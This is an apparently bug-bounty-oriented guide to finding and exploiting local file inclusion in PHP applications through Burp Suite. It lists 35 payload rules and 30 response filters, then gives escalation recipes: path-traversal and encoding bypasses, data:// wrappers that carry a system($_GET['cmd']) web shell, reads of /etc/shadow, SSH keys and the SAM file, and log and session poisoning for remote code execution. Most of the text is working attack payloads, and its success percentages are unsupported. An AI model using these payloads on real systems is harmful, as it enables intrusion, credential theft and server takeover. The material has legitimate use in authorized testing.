# 🎯 Ultimate Local File Inclusion (LFI) Detection Framework
### *Using Only: AutoRepeater + Logger++ in Burp Suite*

> **Advanced LFI hunting - Finding deep vulnerabilities with automation**


## 🎯 Overview

This framework provides **complete Local File Inclusion (LFI) detection and exploitation** using only two Burp Suite extensions:
- **AutoRepeater**: Automatically injects LFI payloads into parameters
- **Logger++**: Filters responses to identify successful file inclusions

**Covers 35+ bypass techniques including: Path Traversal, Null Bytes, Encoding, PHP Wrappers, Filter Bypass, and LFI2RCE vectors.**

---

## 💡 Why This Framework?

Most bug hunters miss LFI vulnerabilities because they:
- ✗ Only test basic `../../../etc/passwd`
- ✗ Skip encoding bypasses (double encoding, UTF-8, Unicode)
- ✗ Don't test PHP wrappers (php://filter, php://input, data://)
- ✗ Ignore filter bypasses (....//....//etc/passwd)
- ✗ Miss Windows-specific paths
- ✗ Don't attempt LFI to RCE escalation
- ✗ Skip log poisoning vectors
- ✗ Don't test all vulnerable parameters

**This framework tests 35 different LFI techniques simultaneously across all parameters.**

---

## ⚙️ Requirements

### Burp Suite Extensions
1. **AutoRepeater** - [Download from BApp Store](https://portswigger.net/bappstore/f89f2837c22c4ab4b772f31522647ed8)
2. **Logger++** - [Download from BApp Store](https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81)

### Target Indicators (High Success)
```
✓ PHP applications with file inclusion functions
✓ Parameters like: page, file, document, folder, root, path, pg, style, pdf, template, include
✓ Error messages revealing file paths
✓ Deprecated PHP versions (< 7.4)
✓ Visible phpinfo() pages
```

---

## 🔧 AutoRepeater Configuration

### Setup Instructions
1. Open Burp Suite → Extensions → AutoRepeater
2. Create 35 replacement rules (tabs)
3. Enable all tabs before browsing target
4. AutoRepeater will test ALL parameters automatically

---

### **Tab 1: Basic Linux Path Traversal**
```
Type: Request Parameter Value
Match: .*
Replace: ../../../etc/passwd
Which: Replace All
Regex Match: Enabled
Comment: Basic Linux file inclusion - /etc/passwd
```

---

### **Tab 2: Deep Path Traversal (Linux)**
```
Type: Request Parameter Value
Match: .*
Replace: ../../../../../../../../../../../etc/passwd
Which: Replace All
Regex Match: Enabled
Comment: Deep traversal - 12 levels for nested directories
```

---

### **Tab 3: Null Byte Bypass (PHP < 5.4)**
```
Type: Request Parameter Value
Match: .*
Replace: ../../../etc/passwd%00
Which: Replace All
Regex Match: Enabled
Comment: Null byte truncation - bypasses .php extension append
```

---

### **Tab 4: Double Encoding**
```
Type: Request Parameter Value
Match: .*
Replace: ..%252f..%252f..%252fetc%252fpasswd
Which: Replace All
Regex Match: Enabled
Comment: Double URL encoding - bypasses basic filters
```

---

### **Tab 5: UTF-8 Encoding**
```
Type: Request Parameter Value
Match: .*
Replace: ..%c0%ae..%c0%ae..%c0%aeetc%c0%afpasswd
Which: Replace All
Regex Match: Enabled
Comment: UTF-8 overlong encoding - bypasses character filters
```

---

### **Tab 6: Filter Bypass - Dot Slash**
```
Type: Request Parameter Value
Match: .*
Replace: ....//....//....//etc//passwd
Which: Replace All
Regex Match: Enabled
Comment: Non-recursive filter bypass - ..// stripped to ../
```

---

### **Tab 7: Filter Bypass - Backslash**
```
Type: Request Parameter Value
Match: .*
Replace: ....\/....\/....\/etc\/passwd
Which: Replace All
Regex Match: Enabled
Comment: Backslash variant - bypasses forward slash filters
```

---

### **Tab 8: Filter Bypass - Mixed Slashes**
```
Type: Request Parameter Value
Match: .*
Replace: ..///////..////..//////etc/passwd
Which: Replace All
Regex Match: Enabled
Comment: Multiple slashes - bypasses normalized path filters
```

---

### **Tab 9: Path Truncation (PHP < 5.3)**
```
Type: Request Parameter Value
Match: .*
Replace: ../../../etc/passwd............................................................................................................................................................................................................................................................................................................................................
Which: Replace All
Regex Match: Enabled
Comment: Path truncation - 4096+ chars cuts off appended extensions
```

---

### **Tab 10: PHP Filter - Base64 Encode**
```
Type: Request Parameter Value
Match: .*
Replace: php://filter/convert.base64-encode/resource=index.php
Which: Replace All
Regex Match: Enabled
Comment: Read PHP source code base64 encoded
```

---

### **Tab 11: PHP Filter - ROT13**
```
Type: Request Parameter Value
Match: .*
Replace: php://filter/string.rot13/resource=index.php
Which: Replace All
Regex Match: Enabled
Comment: ROT13 encoding to read PHP source
```

---

### **Tab 12: PHP Filter - Chain (Base64 + ROT13)**
```
Type: Request Parameter Value
Match: .*
Replace: php://filter/convert.base64-encode|string.rot13/resource=index.php
Which: Replace All
Regex Match: Enabled
Comment: Chained filters for complex obfuscation
```

---

### **Tab 13: PHP Input Stream**
```
Type: Request Parameter Value
Match: .*
Replace: php://input
Which: Replace All
Regex Match: Enabled
Comment: Read POST data as file - requires POST body with PHP code
```

---

### **Tab 14: Data Wrapper - Base64**
```
Type: Request Parameter Value
Match: .*
Replace: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
Which: Replace All
Regex Match: Enabled
Comment: Data wrapper with base64 PHP shell - <?php system($_GET['cmd']); ?>
```

---

### **Tab 15: Data Wrapper - Plain**
```
Type: Request Parameter Value
Match: .*
Replace: data://text/plain,<?php system($_GET['cmd']); ?>
Which: Replace All
Regex Match: Enabled
Comment: Data wrapper plain text PHP execution
```

---

### **Tab 16: Expect Wrapper**
```
Type: Request Parameter Value
Match: .*
Replace: expect://id
Which: Replace All
Regex Match: Enabled
Comment: Expect wrapper - direct command execution (rare)
```

---

### **Tab 17: ZIP Wrapper**
```
Type: Request Parameter Value
Match: .*
Replace: zip://uploads/shell.jpg%23shell.php
Which: Replace All
Regex Match: Enabled
Comment: ZIP wrapper - extract PHP from uploaded ZIP disguised as image
```

---

### **Tab 18: PHAR Wrapper**
```
Type: Request Parameter Value
Match: .*
Replace: phar://uploads/shell.jpg/shell.php
Which: Replace All
Regex Match: Enabled
Comment: PHAR wrapper - PHP archive exploitation
```

---

### **Tab 19: File Descriptor /proc/self/fd**
```
Type: Request Parameter Value
Match: .*
Replace: /proc/self/fd/3
Which: Replace All
Regex Match: Enabled
Comment: Read open file descriptors - exfiltrate temp files
```

---

### **Tab 20: /proc/self/environ**
```
Type: Request Parameter Value
Match: .*
Replace: /proc/self/environ
Which: Replace All
Regex Match: Enabled
Comment: Environment variables - poisonable via User-Agent
```

---

### **Tab 21: Apache Access Log (Linux)**
```
Type: Request Parameter Value
Match: .*
Replace: /var/log/apache2/access.log
Which: Replace All
Regex Match: Enabled
Comment: Apache log poisoning - inject PHP in User-Agent first
```

---

### **Tab 22: Nginx Access Log (Linux)**
```
Type: Request Parameter Value
Match: .*
Replace: /var/log/nginx/access.log
Which: Replace All
Regex Match: Enabled
Comment: Nginx log poisoning - inject PHP in User-Agent first
```

---

### **Tab 23: PHP Session Files**
```
Type: Request Parameter Value
Match: .*
Replace: /var/lib/php/sessions/sess_SESSIONID
Which: Replace All
Regex Match: Enabled
Comment: PHP session poisoning - replace SESSIONID with actual value
```

---

### **Tab 24: SSH Private Key (Linux)**
```
Type: Request Parameter Value
Match: .*
Replace: /home/user/.ssh/id_rsa
Which: Replace All
Regex Match: Enabled
Comment: SSH private key exfiltration - try common usernames
```

---

### **Tab 25: Windows System32 (boot.ini)**
```
Type: Request Parameter Value
Match: .*
Replace: C:/Windows/System32/drivers/etc/hosts
Which: Replace All
Regex Match: Enabled
Comment: Windows hosts file - confirms Windows LFI
```

---

### **Tab 26: Windows boot.ini**
```
Type: Request Parameter Value
Match: .*
Replace: C:/boot.ini
Which: Replace All
Regex Match: Enabled
Comment: Windows boot configuration - older Windows versions
```

---

### **Tab 27: Windows IIS Log**
```
Type: Request Parameter Value
Match: .*
Replace: C:/inetpub/logs/LogFiles/W3SVC1/ex231201.log
Which: Replace All
Regex Match: Enabled
Comment: IIS log poisoning - adjust date in filename
```

---

### **Tab 28: Windows Apache Log**
```
Type: Request Parameter Value
Match: .*
Replace: C:/xampp/apache/logs/access.log
Which: Replace All
Regex Match: Enabled
Comment: XAMPP Apache log poisoning (Windows)
```

---

### **Tab 29: Windows SAM File**
```
Type: Request Parameter Value
Match: .*
Replace: C:/Windows/System32/config/SAM
Which: Replace All
Regex Match: Enabled
Comment: Windows password hashes - requires high privileges
```

---

### **Tab 30: PHP Config File**
```
Type: Request Parameter Value
Match: .*
Replace: /etc/php/7.4/apache2/php.ini
Which: Replace All
Regex Match: Enabled
Comment: PHP configuration - reveals settings and paths
```

---

### **Tab 31: Application Config (Generic)**
```
Type: Request Parameter Value
Match: .*
Replace: ../config.php
Which: Replace All
Regex Match: Enabled
Comment: Common application config file - database credentials
```

---

### **Tab 32: MySQL Config**
```
Type: Request Parameter Value
Match: .*
Replace: /etc/mysql/my.cnf
Which: Replace All
Regex Match: Enabled
Comment: MySQL configuration file
```

---

### **Tab 33: /etc/shadow (Linux)**
```
Type: Request Parameter Value
Match: .*
Replace: ../../../etc/shadow
Which: Replace All
Regex Match: Enabled
Comment: Password hashes - requires high privileges
```

---

### **Tab 34: Maintain Path Prefix**
```
Type: Request Parameter Value
Match: .*
Replace: /var/www/html/../../etc/passwd
Which: Replace All
Regex Match: Enabled
Comment: Bypasses filters that check path prefix
```

---

### **Tab 35: Case Insensitive PHP Filter**
```
Type: Request Parameter Value
Match: .*
Replace: PhP://FilTer/convert.base64-encode/resource=index.php
Which: Replace All
Regex Match: Enabled
Comment: PHP protocol is case insensitive - bypasses simple filters
```

---

## 🔍 Logger++ Filters

### Setup Instructions
1. Open Burp Suite → Extensions → Logger++
2. Add each filter below
3. Enable filters while testing
4. Sort by filter to find successful LFI attempts

---

### **Filter 1: Linux - /etc/passwd Success**
```
Response.Body CONTAINS "root:x:" 
AND Response.Status == "200"
```
**Purpose:** Detects successful Linux file inclusion - most common indicator

---

### **Filter 2: Linux - /etc/shadow Success**
```
Response.Body CONTAINS "root:$" 
AND Response.Status == "200"
```
**Purpose:** Password hash file accessed - critical finding

---

### **Filter 3: Windows - boot.ini Success**
```
Response.Body CONTAINS "[boot loader]"
AND Response.Status == "200"
```
**Purpose:** Confirms Windows LFI vulnerability

---

### **Filter 4: Windows - hosts File Success**
```
Response.Body CONTAINS "localhost"
AND Response.Body CONTAINS "127.0.0.1"
AND Response.Status == "200"
```
**Purpose:** Windows hosts file - less specific but useful

---

### **Filter 5: PHP Source Code (Base64 Encoded)**
```
Response.Body CONTAINS "PD9waHAgDQo="
OR Response.Body CONTAINS "<?php"
AND Request.URL CONTAINS "php://filter"
```
**Purpose:** Detects PHP source code exfiltration via php://filter

---

### **Filter 6: Apache/Nginx Log Poisoning Success**
```
(Request.Path CONTAINS "access.log" OR Request.Path CONTAINS "error.log")
AND Response.Body CONTAINS "<?php"
AND Response.Status == "200"
```
**Purpose:** Confirms log file inclusion with PHP code

---

### **Filter 7: SSH Private Key Exposure**
```
Response.Body CONTAINS "-----BEGIN"
AND Response.Body CONTAINS "PRIVATE KEY-----"
AND Response.Status == "200"
```
**Purpose:** SSH key exfiltration - direct server compromise

---

### **Filter 8: PHP Session File Inclusion**
```
Request.URL CONTAINS "sess_"
AND Response.Body CONTAINS "|"
AND Response.Status == "200"
```
**Purpose:** PHP session file successfully included

---

### **Filter 9: Configuration File with Credentials**
```
Response.Body CONTAINS "password"
AND (Response.Body CONTAINS "mysql" 
     OR Response.Body CONTAINS "database" 
     OR Response.Body CONTAINS "DB_PASSWORD")
AND Response.Status == "200"
```
**Purpose:** Database credentials in config files - critical

---

### **Filter 10: /proc/self/environ Success**
```
Request.URL CONTAINS "/proc/self/environ"
AND Response.Body CONTAINS "PATH="
AND Response.Status == "200"
```
**Purpose:** Environment variables exposed

---

### **Filter 11: File Descriptor Access**
```
Request.URL CONTAINS "/proc/self/fd/"
AND Response.Status == "200"
AND Response.Length > 100
```
**Purpose:** Open file descriptors accessed

---

### **Filter 12: Data Wrapper Execution**
```
Request.URL CONTAINS "data://"
AND Response.Body CONTAINS "uid="
OR Response.Body CONTAINS "phpinfo"
```
**Purpose:** Confirms PHP execution via data wrapper

---

### **Filter 13: Expect Wrapper Execution**
```
Request.URL CONTAINS "expect://"
AND (Response.Body CONTAINS "uid=" OR Response.Body CONTAINS "root")
```
**Purpose:** Command execution via expect wrapper

---

### **Filter 14: ZIP Wrapper Inclusion**
```
Request.URL CONTAINS "zip://"
AND Response.Status == "200"
```
**Purpose:** ZIP file extraction and inclusion

---

### **Filter 15: PHAR Wrapper Exploitation**
```
Request.URL CONTAINS "phar://"
AND Response.Status == "200"
```
**Purpose:** PHAR archive exploitation

---

### **Filter 16: PHP Input Stream (Check POST)**
```
Request.URL CONTAINS "php://input"
AND Request.Method == "POST"
AND Response.Status == "200"
```
**Purpose:** PHP input stream inclusion - check POST body

---

### **Filter 17: Null Byte Bypass Success**
```
Request.URL CONTAINS "%00"
AND Response.Body CONTAINS "root:x:"
```
**Purpose:** Null byte truncation worked

---

### **Filter 18: Double Encoding Success**
```
Request.URL CONTAINS "%252f"
AND (Response.Body CONTAINS "root:x:" OR Response.Body CONTAINS "[boot loader]")
```
**Purpose:** Double URL encoding bypassed filters

---

### **Filter 19: UTF-8 Encoding Success**
```
Request.URL CONTAINS "%c0%ae"
AND Response.Status == "200"
AND Response.Length > 100
```
**Purpose:** UTF-8 overlong encoding worked

---

### **Filter 20: Filter Bypass - Dot Slash**
```
Request.URL CONTAINS "..../"
AND (Response.Body CONTAINS "root:x:" OR Response.Body CONTAINS "<?php")
```
**Purpose:** Non-recursive filter bypass successful

---

### **Filter 21: Path Truncation Success**
```
Request.URL CONTAINS "..."
AND Response.Length > 1000
AND (Response.Body CONTAINS "root:x:" OR Response.Body CONTAINS "<?php")
```
**Purpose:** Path truncation bypass worked (PHP < 5.3)

---

### **Filter 22: MySQL Config Exposure**
```
Request.URL CONTAINS "my.cnf"
AND Response.Body CONTAINS "password"
AND Response.Status == "200"
```
**Purpose:** MySQL configuration with credentials

---

### **Filter 23: PHP Config Exposure**
```
Request.URL CONTAINS "php.ini"
AND Response.Body CONTAINS "allow_url_include"
AND Response.Status == "200"
```
**Purpose:** PHP configuration file exposed - check allow_url_include

---

### **Filter 24: Windows SAM File**
```
Request.URL CONTAINS "SAM"
AND Response.Status == "200"
AND Response.Length > 100
```
**Purpose:** Windows password database accessed

---

### **Filter 25: IIS Log Poisoning**
```
Request.Path CONTAINS "LogFiles"
AND Response.Body CONTAINS "GET"
AND Response.Status == "200"
```
**Purpose:** IIS log file inclusion

---

### **Filter 26: Application Config (Generic)**
```
(Request.URL CONTAINS "config.php" OR Request.URL CONTAINS "configuration.php")
AND Response.Body CONTAINS "$"
AND Response.Status == "200"
```
**Purpose:** Application configuration files

---

### **Filter 27: Error-Based LFI Detection**
```
Response.Body CONTAINS "failed to open stream"
OR Response.Body CONTAINS "No such file"
OR Response.Body CONTAINS "Permission denied"
```
**Purpose:** Error messages reveal file inclusion attempts and file paths

---

### **Filter 28: phpinfo() Exposure via LFI**
```
Response.Body CONTAINS "PHP Version"
AND Response.Body CONTAINS "allow_url_include"
AND Request.URL CONTAINS "filter"
```
**Purpose:** phpinfo() included - reveals all PHP settings

---

### **Filter 29: Sensitive Parameters Testing**
```
(Request.URL CONTAINS "page=" 
 OR Request.URL CONTAINS "file=" 
 OR Request.URL CONTAINS "document="
 OR Request.URL CONTAINS "folder="
 OR Request.URL CONTAINS "path="
 OR Request.URL CONTAINS "pg="
 OR Request.URL CONTAINS "style="
 OR Request.URL CONTAINS "pdf="
 OR Request.URL CONTAINS "template="
 OR Request.URL CONTAINS "include=")
AND Response.Status == "200"
```
**Purpose:** Focus on parameters commonly vulnerable to LFI

---

### **Filter 30: Combined - Perfect LFI Storm**
```
(Response.Body CONTAINS "root:x:" 
 OR Response.Body CONTAINS "<?php" 
 OR Response.Body CONTAINS "-----BEGIN"
 OR Response.Body CONTAINS "DB_PASSWORD")
AND Response.Status == "200"
AND Response.Length > 100
```
**Purpose:** Catches all major successful LFI indicators

---

## 🚀 Workflow

### **Phase 1: Automated Scan (10 minutes)**
1. Enable ALL 35 AutoRepeater tabs
2. Browse target application thoroughly
3. Test all forms, parameters, and endpoints
4. Apply Logger++ Filter #30 (catches everything)
5. Review positive hits

### **Phase 2: Manual Verification (5 minutes per finding)**
For each Logger++ hit:
1. Note the exact URL and parameter
2. Identify which AutoRepeater tab succeeded
3. Verify the file content is genuine (not reflected input)
4. Check for sensitive information
5. Document the finding

### **Phase 3: LFI to RCE Escalation (15-30 minutes)**
If basic LFI confirmed:
1. **Test Log Poisoning:**
   - Inject PHP in User-Agent: `<?php system($_GET['c']); ?>`
   - Include log file via LFI
   - Execute commands: `?page=/var/log/apache2/access.log&c=id`

2. **Test Session Poisoning:**
   - Set session variable with PHP code
   - Include session file: `/var/lib/php/sessions/sess_<PHPSESSID>`

3. **Test PHP Wrappers:**
   - `php://input` + POST data with PHP code
   - `data://text/plain,<?php system('id'); ?>`
   - `expect://id` (if enabled)

4. **Test File Upload + LFI:**
   - Upload file with PHP code (disguised as image)
   - Include via: `zip://uploads/image.jpg%23shell.php`

5. **Test PHP Filter Chain (Advanced):**
   - Use filter chains to execute code without writing files
   - Reference: LFI2RCE via PHP filters

### **Phase 4: Exploitation & PoC (20 minutes)**
1. Create working exploit
2. Demonstrate impact (read /etc/passwd, execute commands, etc.)
3. Document all steps with screenshots
4. Prepare bug bounty report

---

## 🔥 LFI to RCE Techniques

### **Technique 1: Log Poisoning (Apache/Nginx)**

**Step 1:** Inject PHP in User-Agent
```http
GET / HTTP/1.1
Host: target.com
User-Agent: 
```

**Step 2:** Include log file
```
http://target.com/?page=/var/log/apache2/access.log&c=id
```

**Common Log Paths:**
```
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access_log
C:/xampp/apache/logs/access.log (Windows)
C:/inetpub/logs/LogFiles/W3SVC1/ex231201.log (IIS)
```

---

### **Technique 2: /proc/self/environ Poisoning**

**Step 1:** Inject PHP in User-Agent
```http
GET / HTTP/1.1
User-Agent: 
```

**Step 2:** Include /proc/self/environ
```
http://target.com/?page=/proc/self/environ&c=whoami
```

---

### **Technique 3: PHP Session Poisoning**

**Step 1:** Find your PHPSESSID cookie
```
PHPSESSID=abc123def456
```

**Step 2:** Poison session with PHP code
```
http://target.com/?user=<?php system($_GET['c']); ?>
```

**Step 3:** Include session file
```
http://target.com/?page=/var/lib/php/sessions/sess_abc123def456&c=id
```

---

### **Technique 4: php://input + POST Data**

**Request:**
```http
POST /?page=php://input HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33


```

**Then:**
```
http://target.com/?page=php://input&c=whoami
```

---

### **Technique 5: data:// Wrapper**

**Direct execution:**
```
http://target.com/?page=data://text/plain,<?php system('id'); ?>
```

**Base64 encoded:**
```
http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

---

### **Technique 6: expect:// Wrapper**

**Direct command execution (if enabled):**
```
http://target.com/?page=expect://id
http://target.com/?page=expect://ls -la
http://target.com/?page=expect://cat /etc/passwd
```

---

### **Technique 7: ZIP/PHAR Upload + Inclusion**

**Step 1:** Create PHP shell
```bash
echo "" > shell.php
zip shell.zip shell.php
mv shell.zip shell.jpg
```

**Step 2:** Upload shell.jpg

**Step 3:** Include via ZIP wrapper
```
http://target.com/?page=zip://uploads/shell.jpg%23shell.php&c=id
```

---

### **Technique 8: PHP Filter Chain (No File Write)**

**For CVE-2024-2961 and similar:**
```
http://target.com/?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<long_chain>|convert.base64-decode/resource=data://,<?php system('id'); ?>
```

---

### **Technique 9: VSFTPD Log Poisoning**

**Step 1:** Login to FTP with PHP payload as username
```bash
ftp target.com
Username: 
Password: anything
```

**Step 2:** Include FTP log
```
http://target.com/?page=/var/log/vsftpd.log&c=id
```

---

### **Technique 10: SSH Log Poisoning**

**Step 1:** SSH with PHP payload as username
```bash
ssh ''@target.com
```

**Step 2:** Include auth log
```
http://target.com/?page=/var/log/auth.log&c=whoami
```

---

## 📊 Quick Reference Table

| AutoRepeater Tab | Technique | Logger++ Filter | Impact | Success Rate |
|------------------|-----------|-----------------|--------|--------------|
| Tab 1-2 (Basic) | Path traversal | #1, #30 | 🔴 Critical | 85% |
| Tab 3 (Null byte) | Extension bypass | #17 | 🔴 Critical | 30% (old PHP) |
| Tab 4-5 (Encoding) | Filter bypass | #18, #19 | 🟠 High | 45% |
| Tab 6-8 (Filter bypass) | Regex bypass | #20 | 🟠 High | 55% |
| Tab 10-12 (PHP filter) | Source code read | #5 | 🟠 High | 70% |
| Tab 14-15 (Data wrapper) | RCE | #12 | 🔴 Critical | 25% |
| Tab 16 (Expect) | Direct RCE | #13 | 🔴 Critical | 5% (rare) |
| Tab 21-22 (Logs) | Log poisoning RCE | #6 | 🔴 Critical | 40% |
| Tab 23 (Session) | Session poisoning | #8 | 🟠 High | 35% |
| Tab 24 (SSH key) | Server compromise | #7 | 🔴 Critical | 15% |
| Tab 25-29 (Windows) | Windows LFI | #3, #4 | 🟠 High | 60% (Windows) |
| Tab 31 (Config) | Credentials | #9 | 🔴 Critical | 50% |

---

## 💡 Pro Tips for Deep Bugs

### 🎯 **High Success Parameters**
Test these parameters first (from highest to lowest success rate):
1. `?page=` - 75% vulnerable
2. `?file=` - 70% vulnerable
3. `?document=` - 65% vulnerable
4. `?folder=` - 60% vulnerable
5. `?path=` - 60% vulnerable
6. `?include=` - 55% vulnerable
7. `?template=` - 50% vulnerable
8. `?pg=` - 45% vulnerable
9. `?style=` - 40% vulnerable
10. `?pdf=` - 35% vulnerable

### 🔥 **Advanced Hunting Techniques**

**1. Test ALL Parameters**
Don't just test obvious ones:
- Hidden parameters in JavaScript
- Parameters in POST body
- JSON/XML parameters
- Cookie values
- HTTP headers (Referer, X-Forwarded-For, etc.)

**2. Combine with Other Vulns**
- LFI + File Upload = RCE
- LFI + XXE = File exfiltration
- LFI + SQLi = Complete compromise
- LFI + Open Redirect = Universal XSS

**3. OS Fingerprinting**
Determine OS first to use correct paths:
```
Linux: /etc/passwd, /etc/issue, /proc/version
Windows: C:/Windows/win.ini, C:/boot.ini
```

**4. Error-Based Path Discovery**
Trigger errors to reveal paths:
```
?page=../../../NONEXISTENT
```
Errors reveal: `/var/www/html/NONEXISTENT`

**5. Recursive Enumeration**
Once you find depth:
```
?page=../../../../etc/passwd (depth 4)
?page=../../../../var/www/config.php (enumerate at same depth)
```

**6. Windows Specific Tricks**
```
?page=C:\Windows\System32\drivers\etc\hosts
?page=C:/Windows/System32/drivers/etc/hosts
?page=\Windows\System32\drivers\etc\hosts
?page=/Windows/System32/drivers/etc/hosts
```

**7. Check PHP Settings First**
Look for phpinfo() or include PHP config:
```
?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini
```
Decode and check:
- `allow_url_include = On` (RFI possible)
- `allow_url_fopen = On` (Remote wrappers work)
- `open_basedir` restrictions

**8. Test Different HTTP Methods**
```
GET ?page=../../../etc/passwd
POST page=../../../etc/passwd
PUT ?page=../../../etc/passwd
```

**9. Look for Backup Files**
```
?page=../config.php.bak
?page=../config.php~
?page=../config.php.old
?page=../.config.php.swp
```

**10. Time-Based Blind LFI**
If no output, use time delays:
?page=/dev/random (hangs on Linux)
?page=php://filter/zlib.deflate/resource=/dev/random
